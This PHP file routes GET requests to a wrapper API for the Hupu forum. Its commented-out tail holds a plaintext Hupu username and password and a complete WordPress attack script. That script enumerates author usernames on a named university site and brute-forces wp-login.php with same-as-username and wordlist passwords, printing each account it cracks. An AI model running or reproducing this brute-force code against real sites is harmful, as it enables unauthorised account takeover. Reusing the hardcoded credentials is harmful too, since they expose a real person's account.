<?php

require_once 'API.php';
require_once 'Curl.class.php';
require_once 'simple_html_dom.php';
echo "<meta charset='utf-8'>";
$item=$_GET['item'];
$type=$_GET['type'];
$bbsType=$_GET['bbstype'];
$uname=$_GET['uname'];
$pwd=$_GET['pwd'];
$url=$_GET['url'];

if($item=="voice"){
	echo json_encode(HupoAPI::getItemVoice($type));
}
if($item=="bbs"){
	echo print_r(HupoAPI::getBBSItem($type,'hl'));
}
if($item=="page"){
	echo print_r(HupoAPI::getBBSPage($url));
}
if($item=="login"){
	echo HupoAPI::login($uname,$pwd);
}
if($item=="loged"){
	print_r(HupoAPI::getMyBBSArray(972823920));
}
if($item=="mypage"){
	print_r(HupoAPI::getMyBBSBox(972823920));
}
if($item=="test"){
    print_r(HupoAPI::getMyMessage(972823920,null,'board',null,null));
}
/*
$option=array(
	"url"=>"http://passport.hupu.com/login?from=myIndex",
	"folocation"=>true,
	"timeOut"=>4,
	"maxRed"=>4,
	"noBody"=>false,
	"includeHeader"=>false,
	"binaryTrans"=>false
);
$postData=array(
	"username"=>"橘子不说话",
	"password"=>"bjyz330681740",
	"rememberme"=>1
	);
$curl = new CurlUtil($option);
$curl->setPost($postData);
$curl->createCURL();
$html=new simple_html_dom();
//echo $curl->getPage();
$html->load($curl->getPage());
echo $html;
$userUrl=$html->find(".hasLogin .userImports a")->href;
echo $userUrl;
//$myHtml = file_get_html($userUrl);
//echo $myHtml->find(".personal .mpersonal div");
/*
set_time_limit(0);
$domain = "arch.nedu.edu.cn";

//enumerate username
for ($i=1; $i <= 1000; $i++) {

    $url = $domain."/?author=".$i;
    $response = httprequest($url,0);
    if ($response == 404) {
        continue;
    }
    $pattern = "/author\/(.*)\/feed/";
    preg_match($pattern, $response, $name);
    $namearray[] = $name[1];
}
print_r($namearray);

echo "totally got".count($namearray)."users\n";

echo "attempting same username&password：\n";

$crackname = crackpassword($namearray,"same");

$passwords = file("pass.txt");

echo "attempting weak password：\r\n";

if ($crackname) {
    $namearray = array_diff($namearray,$crackname);
}

crackpassword($namearray,$passwords);

function crackpassword($namearray,$passwords){
    global $domain;
    $crackname = "";
    foreach ($namearray as $name) {
        $url = $domain."/wp-login.php";
        if ($passwords == "same") {
            $post = "log=".urlencode($name)."&pwd=".urlencode($name)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
            $pos = strpos(httprequest($url,$post),'div id="login_error"');
            if ($pos === false) {
                echo "$name $name"."\n";
                $crackname[] = $name;
            }
        }else{
            foreach ($passwords as $pass) {
                $post = "log=".urlencode($name)."&pwd=".urlencode($pass)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
                $pos = strpos(httprequest($url,$post),'div id="login_error"');
                if ($pos === false) {
                    echo "$name $pass"."\n";
                }
            }
        }
    }
    return $crackname;
}

function httprequest($url,$post){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);

    if($post){
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }

    $output = curl_exec($ch);
    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode == 404) {
        return 404;
    }else{
        return $output;
    }
}
?>*/
?>
